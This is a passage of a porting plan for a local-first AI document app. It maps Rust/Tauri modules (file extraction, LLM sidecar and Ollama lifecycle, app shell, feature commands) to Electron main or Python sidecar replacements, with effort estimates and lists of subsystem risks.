| `src/extraction/pdf.rs` | 208 | python-sidecar | 1.5 | pypdfium2 (prebuilt PDFium wheels) for text extraction — strictly better than pdf-extract on layout — with fix_visual_hebrew ported verbatim and re-benchmarked, since a better extractor may already emit logical order for some of the same files. |
| `src/extraction/chunking.rs` | 187 | python-sidecar | 0.5 | Direct Python port (~60 lines) in the sidecar's indexing pipeline; property-test the invariant that rejoined chunks equal the original word sequence. |
| `src/extraction/html.rs` | 93 | electron-main | 0.5 | Direct TS port (~50 lines) kept next to the article extractor; or in Python if the import pipeline stays sidecar-side — it is pure string logic either way. |
| `src/commands/json.rs` | 58 | python-sidecar | 0.25 | Trivial Python helpers (or inline dict.get chains) wherever the studios/file-meta reply shaping lands; note the module comment records that bool/tag-array pluckers already migrated to the sidecar in Phase 3. |
| `src/commands/preview.rs` | 47 | electron-main | 0.5 | IPC handler in main: read blob from DB, POST bytes to the sidecar's QuickLook endpoint, return PNG (prefer a Buffer over base64 across contextBridge). |

**Commands owned (36):** `import_files`, `retranscribe_file`, `list_files`, `get_file_content`, `decode_file_text`, `update_file_content`, `trash_file`, `list_trashed_files`, `restore_file`, `set_file_in_library`, `delete_file_permanently`, `empty_trash`, `save_generated_file`, `import_link`, `rename_file`, `add_memory`, `list_memories`, `update_memory`, `delete_memory`, `restore_memory`, `list_folders`, `create_folder`, `rename_folder`, `delete_folder`, `move_file_to_folder`, `get_setting`, `set_setting`, `list_recent`, `remove_recent`, `clear_recent`, `open_scratch_pad`, `slide_preview`, `office_html`, `quicklook_preview`, `update_docx_text`, `set_cell`

**Subsystem risks:** (1) Extraction parity IS the product: every extractor's output is the search index, RAG corpus, and the model's view of each file. Dozens of one-line invariants in comments fixed live-QA 1/5 failures (Turkish encoding, RTF accents, Hebrew mirroring, numeric entities, xlsx columns). Build a golden-fixture corpus (run the Rust extractors over a format zoo, freeze outputs) and diff the Python port against it before cutover; decide explicitly whether .room migration re-extracts (index changes) or carries old text (old bugs preserved). (2) Encoding subsystem is the hardest parity problem: chardetng (Firefox's detector) has no exact Python equivalent — charset-normalizer guesses differently on ambiguous single-byte files, and Python codec names ('cp1254') differ from the WHATWG names ('windows-1254') the viewer's encoding strip/picker contract requires. Use chardetng-py if viable, and build a WHATWG-name shim either way; the picker round-trip (offered label == reported name) is test-pinned today. (3) The fold_edit_char normalization table is shared by THREE matchers (plain-text edit_match in the agent subsystem, docx splice, html splice). The proposed split puts edit application in the sidecar — whoever owns edit_match must import the SAME table. Two copies in two languages will drift and drift here corrupts documents on save. (4) Panic containment has no direct equivalent: Rust catch_unwind confined a malformed file's cost to its own text. Python try/except covers pure-Python parsers, but native extensions (pypdfium2, lxml, python-calamine) can segfault and kill the whole sidecar — strictly worse than today. Subprocess-isolate the parsers of untrusted bytes, or accept sidecar restarts as the blast radius and make the import pipeline resume. (5) xlsx WRITE fidelity: umya-spreadsheet round-trips workbooks; openpyxl drops charts/pivot tables on rewrite, so a one-cell set_cell would silently strip workbook features. The safe route is a raw-XML cell splice (one <c> element changed, every other zip entry raw-copied) — non-trivial because of shared-string vs inline-string cell types, but it is the only no-loss option in TS/Python. (6) Import-pipeline concurrency invariants are undocumented outside comments: room-epoch + path double-pinning of queued OCR/STT jobs (a rollback keeps the path, so path alone passes), single-lane serialization (30 scans one at a time), lock-drop-before-enqueue ordering, and STT_CURRENT-cleared-before-count-drops visibility. An async TS rewrite loses these silently; port them as named invariants with tests. (7) roommedia:// streaming with Range support deliberately replaced base64-over-IPC and its 50MB cliff (a file one byte over silently lost its real viewer). The Electron replacement needs protocol.handle with Range headers and lock-scoped token invalidation, or large PDFs/decks/videos regress. (8) textutil (/usr/bin/textutil) is load-bearing for .doc/.rtf text AND HTML views, but it applies zero validation of its own — the OLE-magic gate and the NUL/control-char echo detector are the only things stopping renamed junk from indexing its own bytes as prose. crate::textutil itself was not in this file list; confirm another inventory covers it or fold it into this workstream. (9) PyObjC for QuickLook and Vision is sanctioned and works (the pyobjc #647 trap is specific to ScreenCaptureKit streaming callbacks), but the decrypted-temp-file discipline around QuickLook (0600 from creation via O_EXCL, extension preserved for dispatch, deletion on every path, 20s hang timeout) is a privacy promise, not a nicety — port it exactly and keep the leftover-file tests. (10) 36 command names and 7 event channels (room-files-changed, import-progress, ocr-progress, stt-progress, agent-open-file, file-updated, plus the FileContent/DecodedFileText payload shapes with camelCase serde names stored in DB columns like web_meta) are the frontend contract; src/api.ts rewiring must keep them byte-identical or coordinate a rename sweep.

### A.8 Engines, sidecar & models

The engines-sidecar-models subsystem (~8,900 LOC Rust) is the host side of every AI call: it spawns and supervises the Python LangGraph sidecar (the app's SOLE engine, no native fallback) and the on-demand `ollama serve` daemon, streams the /run NDJSON answer into ask-* UI events with per-run identity, delivers verified cancellation, manages the Ollama model catalog (pull/warm/delete/capabilities), detects and executes the two cloud coding CLIs (claude/codex) as one-shot subprocesses with a scraped/queried model catalog, holds the OpenRouter provider integration (Keychain key, live catalog with media-modality merges, runtime-config injection), provisions uv/node runtimes for MCP connectors with pinned SHA-256 downloads, and publishes one declared capability record per engine (tri-state Support with Unknown as a first-class answer, preflight verdicts, the provider x agent matrix). In the rewrite virtually all of it lands in Electron main as TypeScript: the sidecar HTTP/NDJSON client, both process lifecycles (child_process + health probes + busy guards), CLI execution via shell-less spawn, provider/catalog caches, and the capability table. The error-sentinel strings (OLLAMA_DOWN, MODEL_MISSING:<model>, SIDECAR_UNAVAILABLE:, SIDECAR_DOWN prose) are a byte-exact contract with the React frontend and the timeout lattice (60s metadata < 300s pull-stall < 900s EXTERNAL_IDLE < 1200s STREAM_IDLE < 3600s request) is pinned by tests and must be preserved as a set.

| File | LOC | → Layer | Days | Replacement |
|---|---|---|---|---|
| `src/sidecar.rs` | 2331 | electron-main | 7 | TS SidecarClient module in Electron main using undici/fetch with AbortController; NDJSON parsed with a small line-splitter over the response body stream; ask-* events forwarded to the renderer via webContents.send with the same TurnId envelope (runId/chatId); cancel delivered by POST /cancel exactly as today. The fake-NDJSON-server tests port directly to node:http fixtures. |
| `src/commands/external.rs` | 1387 | electron-main | 7 | TS module in Electron main. Execution via child_process.spawn with an argv array (no shell) after resolving the login-shell PATH once - this removes the shell-word injection class outright, but keep the is_cli_slug allowlist as defense-in-depth. The Claude executable scan becomes a worker_thread streaming fs read with the same 8 MB chunk + 1 KB overlap; parsers (parse_claude_json_result / parse_codex_json_stream) port 1:1 with their captured-fixture tests. |
| `src/commands/capabilities.rs` | 1019 | electron-main | 4 | TS module in Electron main: the DECLARED table as a typed const array, Support as a string union, capabilities_for composing the same live lookups (ollama capabilities via sidecar, provider facts from the providers module cache, codex catalog from the external module); the matrix IPC handler still POSTs /agent_support to the sidecar. All pure functions (engine_id_of, preflight, vision_door_block, engine_available, agent_rows) port with their tests. |
| `src/ollama.rs` | 847 | electron-main | 4 | TS module in Electron main: thin typed wrappers over the SidecarClient (same endpoint paths and body schemas - the Python side is unchanged), the base-URL override in a settings-backed variable, strip_think_spans/recover_json as pure TS functions with the existing test cases ported. |
| `src/commands/providers.rs` | 742 | electron-main | 3 | TS module in Electron main. Key storage via Electron safeStorage (encrypted blob in userData) with a one-time migration that reads the existing Keychain item ('Arcelle LLM Providers'/'openrouter') - readable from the Python sidecar via PyObjC/Security or a `security find-generic-password` call during migration. Catalog fetch with undici; caches as module-level Maps; the snake_case ProviderRuntimeConfig field names are pinned by the Python sidecar and must not be camelCased. |
| `src/commands/models.rs` | 698 | electron-main | 3 | TS module in Electron main exposing the same seven IPC handlers; pure pickers (best_default, registry_name, vision_keep_alive) port with their tests verbatim; open_ollama via child_process.execFile('open',['-a','Ollama']) checking the exit status; total RAM via os.totalmem(). |
| `src/ollama_lifecycle.rs` | 644 | electron-main | 3 | TS module in Electron main: child_process.spawn of the resolved ollama binary, fetch /api/version reachability, a setInterval watcher applying the same pure should_sleep policy, PID file in the temp dir, ps verification via execFile. Host parsing via a hand-rolled host_of (NOT new URL(), which throws on bare host:port strings this accepts). |
| `src/sidecar_lifecycle.rs` | 617 | electron-main | 3.5 | TS module in Electron main using child_process.spawn with piped stdio; readline over stdout for the port handshake; fetch-based /health probes with the same 3-attempt Busy/Gone classification; token via crypto.randomUUID pair in the child env; stderr piped through a byte-budgeted file writer to app.getPath('temp'). |
| `src/commands/runtimes.rs` | 555 | electron-main | 2 | TS module in Electron main: undici streaming download hashed with node:crypto as it arrives, extraction via /usr/bin/tar spawn (bsdtar auto-detects gzip) with --strip-components=1, install root at path.join(app.getPath('userData'),'runtimes'), runtime-progress events over webContents.send, PATH prefix in a module-level variable the MCP launcher imports. |
| `src/model_limits.rs` | 37 | electron-main | 0.25 | A tiny TS constants module in Electron main, kept next to the CLI-engine code; preserve the doc comment explaining the precedence (live catalog/live envelope first, constants last). |

**Commands owned (16):** `grounding_model_for_room`, `ai_status`, `model_capabilities`, `open_ollama`, `warm_model`, `pull_model`, `delete_model`, `list_engine_models`, `list_ai_providers`, `connect_ai_provider`, `disconnect_ai_provider`, `mcp_runtime_for_command`, `mcp_provision_runtime`, `engine_preflight`, `engine_capabilities`, `engine_support_matrix`

**Subsystem risks:** (1) Error-sentinel strings are a byte-exact cross-layer contract: 'OLLAMA_DOWN' is the frontend's literal trigger for the Open Ollama button, 'MODEL_MISSING:<model>' is branched on, 'SIDECAR_UNAVAILABLE:' / SIDECAR_DOWN prose are matched upstream, and PULL_CANCELLED is shown verbatim - since src/api.ts is being rewired anyway, either preserve every token or migrate both sides in one commit with a contract test (2) Cancellation semantics do not port for free: aborting a fetch (AbortController) does NOT stop the sidecar's non-streaming handlers (measured multi-second run-on against pinned uvicorn), so the delivered /cancel-with-run_id protocol, the known-field verification, and the one-retry-on-race must be reimplemented exactly - a 'simplified' abort-only port silently burns the single local-model slot after every Stop (3) The timeout lattice is an ordered system, not independent constants: metadata 60s < pull-stall 300s < caller watchdogs 300/960s < sidecar EXTERNAL_IDLE 900s < STREAM_IDLE 1200s < request 3600s < chain 10h, with the two gateways sharing ONE generation budget (they drifted once and truncated hour-long CLI sessions at 10 minutes) - port the pinning tests, not just the numbers (4) The zsh -ilc probes (CLI detection, ollama binary resolution, CLI execution PATH) source the user's whole .zshrc and are the diagnosed-unfixed root cause of the endless macOS TCC 'data from other apps' prompt loop; the Electron rewrite will inherit it unless probes are cached once per session (the ai_status regression that spawned two probes per call is the cautionary tale) and execution switches to shell-less spawn of pre-resolved absolute paths (5) Keychain migration: OpenRouter keys live in the real macOS Keychain (service 'Arcelle LLM Providers') and the room-crypto subsystem uses Keychain 'PrivateRoom'; Electron safeStorage is a different store, and a changed signing identity can lose ACL access to the old items - the one-time .room converter needs a key-migration step plus a graceful re-enter-key path, and note that ad-hoc signing resets TCC grants on every rebuild (6) The privacy door's transport predicate (base_is_local -> ollama_runs_here -> image_reaches_model -> declared_for().local) is what keeps content on the Mac under the 'Local only' chip; porting host parsing to new URL() or a substring check re-opens the exact leaks these functions were written against (localhost-lookalike hosts, the <size>-cloud tag spelling, the Closet override) - port the differential tests that assert the OLD wrong predicates still fail (7) Process-lifecycle races were closed with lock discipline (watcher holds the admission lock across check-and-kill; busy counts protect a streaming sidecar from health-probe replacement; single-flight spawns; PID-file adoption gated on ps verification): Node's single event loop removes data races but every await is a yield point - the Busy/inflight bookkeeping must be try/finally-exact or a wedged-sidecar replacement will again kill in-flight answers, and unconsumed child stdio pipes wedge children in Node just as in Rust (8) run_external's shell-word construction is a live attack surface (the model string arrives inside shareable .room files); the TS port must use argv-array spawn with no shell AND keep the slug allowlist, and must reproduce the temp-dir guarantee (decrypted attachments + MCP bearer token removed on every exit path, failures logged by path) (9) Several invariants are enforced by Rust-specific meta-tests that do not port (include_str! lint asserting every sidecar POST is authed, the textual KEEP_ALIVE_WARM pin, compile-time exhaustive Capability matching) - each needs a TS equivalent (single request factory + ESLint rule, shared constant import, exhaustive switch with never-check) or the guarded regressions return unwatched (10) Event identity and payload fidelity: ask-* events must keep the TurnId envelope (runId/chatId), the foreign-run_id line drop, the usage payload's t/run_id stripping (it is persisted into room message rows), and the per-round mirror reset - losing any of these re-opens the orphaned-run painting, leaked-id persistence, and 'the reply was lost' bugs that took three QA waves to close (11) Two heavy operations sit on hot paths and will freeze Electron's main process if ported naively: the 230 MB Claude executable scan (needs a worker_thread) and pull progress (hundreds of NDJSON lines/sec that must stay throttled to 0.5% steps before crossing IPC)

### A.9 App shell & misc

Shell-app-misc subsystem: the Tauri app entry/lifecycle (lib.rs/main.rs), native menu bar (menu.rs), the commands module hub with AppState + shared constants (commands.rs), the privacy-preserving host event log (obs.rs), the macOS textutil converter bridge (textutil.rs), the offline roomai CLI (bin/roomai.rs), and seven command modules: feedback drafting, room safety ops (versions/export/rekey/duplicate/compact), the diff-preview edit gate, the fuzzy byte-safe edit engine, bulk file verbs, the script consent/run surface, room-wide search, and the RAG retrieval core with its background backfill passes. 11,439 LOC total, 28 #[tauri::command] handlers in-group (lib.rs additionally registers all 308 app-wide). Most of this ports to Electron main (TS): IPC registry, Menu.buildFromTemplate, protocol.handle for roommedia (Range/206) and roomdoc (CSP-sandboxed HTML), before-quit unsaved-edits hold + recording flush, logfmt logger, edit engine, retrieval math over better-sqlite3 FTS5 + Float32Array cosine. textutil goes to the Python sidecar (document parsing per split rule); roomai becomes a small Node CLI sharing the new DB module. Two structural notes: (1) Electron's before-quit DOES fire on Cmd+Q, so the entire tao applicationShouldTerminate: workaround (custom Quit menu row, QUIT_ID machinery) collapses into one preventDefault flow — keep the latch semantics, delete the mechanism; (2) the get_webview_window child-webview trap disappears with Tauri, but its lesson (browser is a second WebContentsView on the same window) still shapes the Electron window architecture. Estimated ~48 senior-dev days including tests.

| File | LOC | → Layer | Days | Replacement |
|---|---|---|---|---|
| `src/commands/edit_match.rs` | 2422 | electron-main | 7 | TS module in Electron main (pure string/byte logic + DB transactions; no native APIs). Port the fold table (from the extraction module — coordination point with the docs subsystem), normalize_with_spans over Buffer byte offsets or consistently over code points, and commit via better-sqlite3 transactions. The docx/html replace helpers live in extraction (another subsystem) — the seam between them must be re-drawn together. |
| `src/commands.rs` | 1234 | electron-main | 5 | TS: an AppState service class in Electron main (Maps + plain fields; JS single-threaded main removes the mutex, but keep an async-aware room-busy discipline for worker-thread ops); DTOs as zod schemas shared with src/apiTypes.ts; constants module; humanize_storage_error/is_synced_path/WebLanes as pure functions ported near-verbatim with their tests. |
| `src/obs.rs` | 1158 | electron-main | 4 | TS module in Electron main: hand-rolled logfmt sink (rotate-on-open to .prev, rotate at 4MB — do NOT use a rolling appender that never deletes), Val as a class with a private constructor exported only via the checked factory functions, err_kind classifier ported verbatim, ARCELLE_LOG validation ('parses but cannot speak about us' = fall back + record it). reveal_logs via shell.showItemInFolder. |
| `src/menu.rs` | 970 | electron-main | 3 | Electron Menu.buildFromTemplate with roles (about, services, hide/hideOthers/unhide, undo/redo/cut/copy/paste/selectAll, minimize, zoom, close, togglefullscreen); custom items send one 'menu-action' channel with the row id; a 'menu-sync' ipcMain handler sets checked/enabled/label via Menu.getApplicationMenu().getMenuItemById(). Keep the data-driven spec so the unit tests (unique ids, clipboard keys present, every check row has a payload field) port as plain Jest tests. |
| `src/commands/retrieval.rs` | 904 | electron-main | 4 | TS in Electron main next to the DB: stream embedding blobs row-by-row (better-sqlite3 iterate) into Float32Array cosine, keep only (rowid, cos) pairs, hydrate winners' text by rowid batch; FTS ranked query for the keyword leg; RRF combine. The embed call itself is HTTP to Ollama (see backfill.rs). Port every pure helper with its tests verbatim. |
| `src/commands/scripts.rs` | 876 | electron-main | 4 | TS: approvals JSON under app.getPath('userData'); consent via the same pending-Map + webContents.send pattern as the edit gate; crypto.createHash('sha256') fingerprints; the runner/workflow/queue seams belong to the jobs subsystem (jobs::script_run — covered elsewhere); interpreter resolution (uv/node) shared with the runtimes module. |
| `src/lib.rs` | 779 | electron-main | 5 | Electron main.ts: BrowserWindow + ipcMain.handle registry (one entry per former command, generated from a manifest so parity is checkable), protocol.handle('roommedia') and protocol.handle('roomdoc') implementing Range 206 and CSP headers by hand, app.on('before-quit') for the unsaved-edits hold + bounded recording flush, app.on('open-file') for Finder, window move/resize debounce + geometry JSON. Sidecar/ollama teardown via child_process kill on 'will-quit'. |
| `src/commands/safety.rs` | 773 | electron-main | 5 | TS in Electron main over the new DB service. Heavy ops (rekey, VACUUM, export_all) run in a worker_thread — better-sqlite3 is synchronous and would freeze the whole main process including IPC (the Rust code used block_in_place for exactly this). Quarantine xattr via child_process to /usr/bin/xattr -w (or the fs-xattr prebuilt) — Electron has no builtin. Rekey via better-sqlite3-multiple-ciphers PRAGMA rekey; checkpoint copies re-keyed by opening each with the OLD password. Touch ID keychain update through whatever biometrics module replaces biometrics.rs. |
| `src/commands/edit_gate.rs` | 524 | electron-main | 2.5 | TS: same three-phase flow with a pending Map<string, resolver>; card via webContents.send, decision via ipcMain; apply inside a better-sqlite3 transaction. The Rust lock-discipline comment ('guard never held across await') becomes: never leave a DB transaction open across the consent await. |
| `src/bin/roomai.rs` | 502 | npm-or-pypi-lib | 2 | Small Node CLI (bin script in the app repo) sharing the new TS DB module (better-sqlite3-multiple-ciphers), or a Python CLI in the sidecar package sharing its DB layer — the load-bearing property is ONE code path with the app's crypto scheme, no second implementation to drift. Pure-parse/run split kept for unit tests. |
| `src/commands/bulk.rs` | 436 | electron-main | 1.5 | TS over the DB service, same BulkReport shape into src/apiTypes.ts; the four ipcMain handlers plus the shared *_in functions the agent tools call. |
| `src/textutil.rs` | 296 | python-sidecar | 1.5 | Python: subprocess to /usr/bin/textutil (fixed path, ships with every Mac, nothing to bundle) writing the decrypted bytes to a 0o600 exclusively-created tempfile deleted in a finally/context-manager on every path; resolve_field_codes ported as a pure function with its test corpus. Sidecar owns it per the split rule (document parsing). |
| `src/commands/retrieval/backfill.rs` | 267 | electron-main | 1.5 | TS async loops in Electron main with an incrementing generation counter in AppState (each room unlock bumps it; a loop whose stamp is stale exits, so at most one pass is ever live); Ollama /api/embed via fetch with keep_alive '30s' (documents) / '5m' (questions). |
| `src/commands/feedback.rs` | 146 | electron-main | 1 | app_diag from app.getVersion() + os.version() + process.arch; feedback_draft stays a thin proxy to the sidecar's existing /feedback_draft endpoint, keeping the local-model-only guard (non-local room model swapped for best local default) in the main-process handler. |
| `src/commands/search.rs` | 146 | electron-main | 1 | TS over better-sqlite3 FTS5 + LIKE queries, reusing the ported fts_match_expr/make_snippet from the retrieval module. |
| `src/main.rs` | 6 | dropped | 0 | No equivalent needed — Electron's entry is the package.json "main" field pointing at the compiled main.ts. |

**Commands owned (28):** `web_search_test`, `reveal_logs`, `menu_sync`, `resolve_edit_approval`, `search_all`, `trash_files`, `move_files_to_folder`, `restore_files`, `delete_files_permanently`, `resolve_script_run`, `list_scripts`, `get_script_manifest`, `run_script`, `set_script_schedule`, `app_diag`, `feedback_draft`, `list_file_versions`, `file_versions_kept`, `pin_file_version`, `delete_file_version`, `get_file_provenance`, `get_file_version`, `restore_file_version`, `export_file`, `export_all`, `change_password`, `duplicate_room`, `compact_room`

**Subsystem risks:** (1) Command-registry parity: lib.rs's generate_handler! is compile-checked against 308 commands; a hand-built ipcMain registry fails SILENTLY on a missing entry. Build the registry from a manifest and add a completeness test cross-checked against src/api.ts before porting any subsystem. (2) UTF-8 byte spans vs UTF-16 JS strings: edit_match.rs (and make_snippet) do all matching over byte ranges into the original bytes. Port the Hebrew/ligature/Turkish test corpus FIRST and pick one indexing basis (Buffer byte offsets) or the fuzzy editor will silently corrupt multibyte files. (3) Synchronous better-sqlite3 on the Electron main thread: the Rust code used block_in_place for rekey/VACUUM/export_all because they take minutes on multi-GB rooms; in Electron the equivalent MUST be worker_threads (async alone does not help a sync driver) or every quit/save/IPC freezes with them. (4) SQLCipher-replacement parity for the safety flows: change_password depends on verify-on-second-connection, live PRAGMA rekey, VACUUM INTO, and rekey of standalone checkpoint copies from the OLD password. Prototype all four on better-sqlite3-multiple-ciphers (and confirm FTS5 is in the build — retrieval and search_all need it) before freezing the DB decision; the .room migration story must also keep the roomai CLI able to verify both container generations. (5) Quit-lifecycle rewrite risk: Electron's before-quit fires on Cmd+Q (the tao hole is gone), so menu.rs's custom QUIT_ID row and lib.rs's ExitRequested arm must be REDESIGNED into one preventDefault flow, not ported twice — two quit paths is how the unsaved-edits latch or the recording flush gets skipped on one of them. Keep the ordering invariant: flush recording before unloading Whisper, and run teardown (browser session discard, sidecar/ollama kill, preview cleanup, geometry save) even on Dock-quit/logout. (6) obs privacy boundary weakens in TS: Rust made unloggable values unspellable (module-private enum); TypeScript can only approximate with private constructors + lint. The ported leak tests (room-content corpus through every helper AND through the real sink) are the actual guarantee — land them with the logger, not after. (7) No Electron builtin for com.apple.quarantine xattrs: choose subprocess /usr/bin/xattr vs the fs-xattr native module early; the mark is a security behaviour (exports must not launder downloads) with a best-effort branch (FAT/network volumes) that needs real-filesystem testing. (8) Menu accelerator ownership: ⌘1/⌘2/⌘T/⌘W must live ONLY on the native menu (they must work while the browser WebContentsView has focus) and the renderer must not re-claim them — the double-owner bug (pane toggled twice = never moves) will reappear if the old useLayout listeners are resurrected during the api.ts rewiring. (9) Cross-subsystem seams concentrated here: edit_match depends on extraction:: (fold table, docx/html replace, decode_text_bytes) owned by the docs/parsing group (destined for the Python sidecar per the split rule) while the edit engine itself needs synchronous DB transactions in Electron main — either the fold/replace helpers get a TS twin (drift risk the codebase explicitly fought) or edits round-trip to the sidecar (latency + transaction split). Decide this seam explicitly; bulk.rs similarly needs the recording-engine stop seam and scripts.rs the jobs/workflow queue before they can land. (10) Prompt-surface strings are load-bearing: edit errors (closest_snippet, 'read it again and retry'), script-run framings ('quote these values exactly'), decline vs no-answer wordings all steer the local 4B model's behaviour — port them verbatim and treat rewording as a behaviour change requiring re-QA.

### A.10 Feature commands

Feature-commands subsystem: 22 Rust files, ~15,510 LOC (~3,500 of it tests), 77 #[tauri::command] handlers. Five clusters: (1) the privacy gatekeeper (privacy.rs) — mechanical Aho-Corasick redact/restore over the room's entity map, a cached policy consulted by every outbound seam, and a background per-file scanner that pins room path+epoch; (2) Agent Skills (skills.rs) — encrypted CRUD, SKILL.md folder import/export, AI composition, and consent-gated script execution in a swept decrypted workspace; (3) the drawing stack (sketch.rs + sketchdoc.rs) — a line-based script language the model writes instead of SVG, all-or-nothing validation, a geometric layout checker, a wobbly-hand SVG renderer and resvg PNG rasterizer; (4) creative/media features (create.rs catalog, story.rs storyboards, vision.rs grounding, video.rs probe/trim/frame, studios/* flashcards/mindmap/podcast incl. TTS episode rendering); (5) 'moonshot' room intelligence (front page, room graph, AI actions, roles, Leash MCP server + Closet remote-Ollama, leash.json discovery) plus the ART-1 artifact write funnel (artifact.rs) that every AI-generated file passes through. Most model compute already migrated to sidecar endpoints (/ai_action, /privacy_scan, /vision_locate, /summarize_file, /tts/podcast, /label, /memory_suggestion, /suggest_file_meta, /generate_ui_text, /knowledge_extract) — Rust is largely gather/validate/save orchestration, which ports naturally to Electron main TS over better-sqlite3, with video/vision native work landing in the PyObjC sidecar. Estimated total: ~52 senior-dev days including tests.

| File | LOC | → Layer | Days | Replacement |
|---|---|---|---|---|
| `src/commands/sketchdoc.rs` | 2811 | electron-main | 6 | ONE shared TypeScript library consumed by both the renderer's sketch editor and main-process agent tools — src/viewers/sketch/model.ts already twins routeBetween/CONNECT_GAP, so the port should MERGE the two implementations; rasterize SVG→PNG with @resvg/resvg-js (prebuilt napi binary, accepts font buffers replacing fontdb). |
| `src/commands/privacy.rs` | 1831 | electron-main | 6 | TS module in Electron main holding the policy cache and mechanical redactor (longest-first case-insensitive matching via a sorted alternation regex or the modern-ahocorasick npm package), injected into every sidecar request body exactly as inject_policy does today; the scanner loop becomes an async task in main calling the existing sidecar /privacy_scan; the sidecar's privacy.py already implements the twin mechanics. |
| `src/commands/skills.rs` | 1811 | electron-main | 7 | TS module in Electron main over better-sqlite3 for CRUD/validation; folder import/export via node:fs; script runs via child_process.spawn in an app-cache workspace with the same consent flow; keep the hand-rolled minimal YAML frontmatter parse/render (block scalars, quote unescaping) rather than a YAML lib to preserve byte-identical exports. |
| `src/commands/moonshot/graph.rs` | 1163 | electron-main | 3 | Pure TS in Electron main reading embeddings/citations/derivation rows from better-sqlite3; port the constants and every seed test verbatim — the tuning history (adaptive floors, caps) is the value. |
| `src/commands/sketch.rs` | 1014 | electron-main | 3 | TS in Electron main over the shared sketchdoc TS library; agent tools registered in the rewritten tool dispatcher; events become webContents.send with identical payloads. |
| `src/commands/story.rs` | 930 | electron-main | 3 | TS in Electron main; thumbnails (192px JPEG, cached by file id) via sharp (prebuilt); cast reading already calls the sidecar's /knowledge_extract; shotsplit port is pure logic. |
| `src/commands/studios.rs` | 844 | electron-main | 3 | TS in Electron main: run_studio_core as an async function over the ported engine client; open_html_in_browser via shell.openPath/openExternal on a temp file with the same sweeps; stage_preview_html backing a custom protocol handler (protocol.handle) replacing roomdoc://. |
| `src/commands/studios/podcast_audio.rs` | 561 | electron-main | 2.5 | TS in Electron main: the door check per line against the ported speakable_text, the sidecar /tts/podcast call (unchanged), afconvert via child_process with temp-dir cleanup; refold/naming logic is pure and ports with its tests. |
| `src/commands/moonshot/ai_actions.rs` | 539 | electron-main | 3 | TS in Electron main: catalog stays a typed constant (order is the frontend contract), runner keeps gather → resolve → cancellable sidecar POST → guard_commit → Artifact save; the prompts/schemas already live in the sidecar's /ai_action table. |
| `src/commands/video.rs` | 515 | python-sidecar | 3 | Probe via PyObjC AVFoundation in the sidecar (media_probe equivalent; the allowed pattern — NOT ScreenCaptureKit); trim by spawning /usr/bin/avconvert from the sidecar with 0600 temp files; save_video_frame (base64 decode + PNG magic check + insert) stays in Electron main. |
| `src/commands/moonshot/server.rs` | 462 | electron-main | 2 | TS in Electron main controlling the rewritten MCP bridge (official @modelcontextprotocol/sdk server, node:http on 127.0.0.1); Closet URL normalization is a pure function; persistence stays in room settings. |
| `src/commands/vision.rs` | 415 | python-sidecar | 2 | The canvas work (prepare, prompt, schema, parse) already lives in the sidecar's /vision_locate (Pillow); port the remaining Rust bits — grounding_pick model selection, vision_door_block sentinel mapping, ground_prepared_image for the agent's mark_image path, and is_locate_intent — into the sidecar plus a thin main-process picker. |
| `src/commands/summarize.rs` | 387 | electron-main | 1.5 | TS in Electron main: keep the deterministic HTML assembly (escaped, themed via the ported doc_hero/html_document helpers) and the two thin sidecar calls; the model compute is already fully in the sidecar. |
| `src/commands/create.rs` | 383 | electron-main | 1 | Pure TS function in Electron main over the ported provider-catalog module (list_provider_models + media_limits); trivial logic, port the tests. |
| `src/commands/studios/podcast.rs` | 355 | electron-main | 1 | TS spec + store hook writing the podcasts table rows and seeding distinct voices from the room's last-known catalog. |
| `src/commands/artifact.rs` | 345 | electron-main | 1.5 | TS builder class in Electron main over the ported db layer's stage/commit transactions (better-sqlite3 is synchronous, which makes the stage→check-cancel→commit window even tighter than the Rust original). |
| `src/commands/studios/flashcards.rs` | 309 | electron-main | 1 | TS spec object + template-string renderer; identical HTML output. |
| `src/commands/studios/mindmap.rs` | 240 | electron-main | 0.75 | TS spec + renderer; keep the clean-hierarchy choice (no force-layout lib — the RoomMap viewer owns the physics constellation). |
| `src/commands/moonshot/front_page.rs` | 227 | electron-main | 1 | TS in Electron main over better-sqlite3; pure front_page_of function kept testable; suggestions call the existing sidecar /label. |
| `src/commands/moonshot/roles.rs` | 132 | electron-main | 0.25 | A typed constant in TS; role_instructions lookup used by the ported agent prompt assembly. |
| `src/commands/moonshot.rs` | 129 | electron-main | 0.5 | TS in Electron main; resolve_structured_model becomes the shared resolver in the ported engine layer; pull progress re-emitted over webContents.send. |
| `src/commands/moonshot/discovery.rs` | 107 | electron-main | 0.5 | node:fs in Electron main: open with mode 0o600 AND chmod after (a leftover file keeps its looser mode otherwise), remove on stop/teardown/app exit. |

**Commands owned (77):** `privacy_status`, `set_privacy_room`, `set_privacy_global`, `add_privacy_block`, `remove_privacy_entity`, `set_privacy_concepts`, `privacy_preview`, `start_privacy_scan`, `skill_agent_ids`, `list_skills`, `get_skill`, `create_skill`, `update_skill`, `set_skill_enabled`, `delete_skill`, `get_skill_resource`, `save_skill_resource`, `delete_skill_resource`, `import_skill_folder`, `skill_import_conflict`, `export_skill_folder`, `compose_skill`, `create_sketch`, `save_sketch`, `export_sketch_svg`, `export_sketch_png`, `list_create_models`, `story_board`, `story_pictures`, `story_add_cast`, `story_update_cast`, `story_set_face`, `story_remove_cast`, `story_create_list`, `story_update_list`, `story_set_shape`, `story_delete_list`, `story_add_shot`, `story_update_shot`, `story_remove_shot`, `story_documents`, `story_text_from_file`, `story_read_cast_file`, `story_add_cast_many`, `story_plan_split`, `story_apply_split`, `story_reorder_shots`, `locate_in_image`, `probe_video_meta`, `video_trim`, `save_video_frame`, `recommended_models`, `ensure_embed_model`, `ai_action_prompts`, `ai_action`, `memory_suggestion`, `suggest_file_meta`, `generate_ui_text`, `front_page`, `front_page_suggestions`, `room_graph`, `list_roles`, `room_server_status`, `set_room_server`, `regenerate_leash_token`, `set_ollama_url`, `test_ollama_url`, `get_ollama_url`, `open_html_in_browser`, `stage_preview_html`, `studio_prompts`, `studio_flashcards`, `studio_mindmap`, `generate_podcast_script`, `get_podcast`, `set_podcast_cast`, `preview_podcast_voice`

